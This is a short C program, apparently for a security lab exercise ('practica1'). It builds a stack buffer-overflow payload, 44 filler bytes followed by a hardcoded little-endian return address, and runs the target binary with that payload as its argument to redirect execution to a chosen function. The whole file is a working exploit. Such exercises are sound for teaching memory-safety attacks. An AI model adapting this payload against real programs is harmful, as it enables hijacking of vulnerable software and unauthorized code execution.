#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
    // Configuración del payload
    int offset = 44;
    unsigned int func_addr = 0x004005ad;

    // Reservamos espacio: 44 'A' + 4 bytes para dirección
    char payload[49];
    memset(payload, 'A', offset);

    // Insertamos la dirección en little endian
    payload[offset]     = (func_addr)       & 0xff;
    payload[offset + 1] = (func_addr >> 8)  & 0xff;
    payload[offset + 2] = (func_addr >> 16) & 0xff;
    payload[offset + 3] = (func_addr >> 24) & 0xff;

    // Null-terminate
    payload[48] = '\0';

    // Ejecutar ./practica1 con el payload como argumento
    char *args[] = {"./practica1", payload, NULL};
    execv(args[0], args);

    // Si falla execv
    perror("execv");
    return 1;
}
